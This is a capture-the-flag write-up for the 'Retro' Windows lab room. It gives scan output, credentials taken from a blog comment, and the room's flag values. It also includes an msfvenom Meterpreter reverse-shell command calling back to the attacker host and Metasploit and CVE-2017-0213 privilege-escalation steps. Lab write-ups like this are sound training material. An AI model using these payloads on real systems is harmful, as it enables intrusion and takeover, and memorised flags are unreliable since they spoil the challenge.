# Retro

```
Can you time travel? If not, you might want to think about the next best thing.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

-------------------------------------

There are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work. Please check writeups if you are curious regarding the two paths. An alternative version of this room is available in it's remixed version Blaster.
```

## Task 1 Pwn

```
#1 A web server is running on the target. What is the hidden directory which the website lives on?

/retro
```
```
#2 user.txt (+) 50

3b99fbdc6d430bfb51c72c651a261927
```
```
#3 root.txt (+) 100

7958b569565d7bd88d10c6f22d1c4063
```

### Code

```
export ip=10.10.121.250
```
## nmap scan
Again the machine denies icmp PING, using -Pn ...
```
$ nmap -sC -sV -Pn -oN nmap.txt $ip

# Nmap 7.80 scan initiated Thu Jun 25 14:19:46 2020 as: nmap -sC -sV -Pn -oN nmap.txt 10.10.121.250
Nmap scan report for 10.10.121.250
Host is up (0.085s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-06-25T11:20:04+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-06-24T11:18:26
|_Not valid after:  2020-12-24T11:18:26
|_ssl-date: 2020-06-25T11:20:05+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 25 14:20:05 2020 -- 1 IP address (1 host up) scanned in 18.86 seconds

```
## gobuster
```
$ gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.121.250
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/25 14:21:30 Starting gobuster
===============================================================
/retro (Status: 301)

```
Found a $ip/retro dir, website about retro games, on Task #2 I found that the author is Wade, and he left a comment @ $ip/retro/index.php/2019/12/09/ready-player-one/#comment-2, stating:
```
"
	Wade
	December 9, 2019

Leaving myself a note here just in case I forget how to spell it: parzival
"
```
so 'parzival' is a potential password and 'Wade' is a username ...
```
Windows creds = wade:parzival
```
There is rdp on the box so lets try login with the creds ... IT WORKED !

user.txt @ Desktop : 3b99fbdc6d430bfb51c72c651a261927

pic1.png
pic2.png - we can see that there is something in the recycle bin ...
pic3.png - we can see a hint CVE-2019-1388 @ the bookmarks in Google Chrome ...
A quick Google search leads us here

hhupd.exe @ Desktop : found this CVE-2019-1388 @ https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/

https://www.youtube.com/watch?v=3BQKpPNlTSo - video on the exploit from the site above ...

Lets try it !

Uh OH
pic4.png - a bummer there is an issue with the default browser entry... lets try to fix that

Meh, still nothing, I am going to try Metasploits exploit Suggester to see anything else...
Lets create a meterpreter shell exe and put it on the victim via simple.http server ...
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.9.96 LPORT=4447 -f exe > shell.exe
```
```
[*] Started reverse TCP handler on 10.9.9.96:4447 
[*] Sending stage (176195 bytes) to 10.10.121.250
[*] Meterpreter session 1 opened (10.9.9.96:4447 -> 10.10.121.250:50636) at 2020-06-25 14:59:35 +0300

meterpreter > getuid
Server username: RETROWEB\Wade
meterpreter > bg
$ use post/multi/recon/local_exploit_suggester;

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.121.250 - Collecting local exploits for x86/windows...
[*] 10.10.121.250 - 32 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.121.250 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[*] Post module execution completed

```

lets use exploit/windows/local/ikeext_service

```
msf5 exploit(windows/local/ikeext_service) > show options 

Module options (exploit/windows/local/ikeext_service):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DIR                       no        Specify a directory to plant the DLL.
   SESSION  1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.9.96        yes       The listen address (an interface may be specified)
   LPORT     4447             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64


msf5 exploit(windows/local/ikeext_service) > run
[*] Started reverse TCP handler on 10.9.9.96:4447 
[*] Checking service exists...
[!] UAC is enabled, may get false negatives on writable folders.
[*] Checking %PATH% folders for write access...
[*] Sending stage (201283 bytes) to 10.10.121.250
[*] Path C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps does not exist...
[*] Path  does not exist...
[*] Meterpreter session 2 opened (10.9.9.96:4447 -> 10.10.121.250:51135) at 2020-06-25 15:20:41 +0300 
[*] Attempting to create a non-existant PATH dir to use.
[-] Exploit aborted due to failure: not-vulnerable: Unable to write to any folders in the PATH, aborting...
[*] Exploit completed, but no session was created.

```

OK ... lets use a python script then - windows-privesc-check(https://github.com/pentestmonkey/windows-privesc-check)

BINGO! It seems vulnerable to CVE-2017-0213
(https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213)

lets run CVE-2017-0213_x64.exe, and here we go a system shell

```
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7443-948C

 Directory of C:\Users\Administrator\Desktop

12/08/2019  09:06 PM    <DIR>          .
12/08/2019  09:06 PM    <DIR>          ..
12/08/2019  09:08 PM                32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30,333,550,592 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
7958b569565d7bd88d10c6f22d1c4063
```